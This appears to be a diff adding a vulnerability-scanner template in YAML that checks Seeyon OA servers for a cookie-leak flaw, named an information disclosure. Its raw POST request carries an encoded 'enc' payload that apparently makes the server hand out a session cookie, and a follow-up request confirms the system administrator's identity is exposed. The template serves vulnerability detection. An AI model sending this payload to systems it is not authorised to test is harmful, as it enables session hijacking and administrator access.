@@ -1,0 +1,44 @@
+id: poc-yaml-seeyon-oa-cookie-leak
+info:
+  name: Seeyon Oa Cookie Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure
+  description: |
+    This template detects potential information leakage in Seeyon OA systems, specifically cookie leaks and system administrator information exposure.
+http:
+  - raw:
+      - |
+        POST /seeyon/thirdpartyController.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "JSESSIONID="
+      - type: word
+        part: body
+        words:
+          - "/seeyon/common/"
+  - raw:
+      - |
+        GET /seeyon/main.do?method=headerjs HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"name\":\"系统管理员\""
+          - "\"id\":\"-7273032013234748168\""
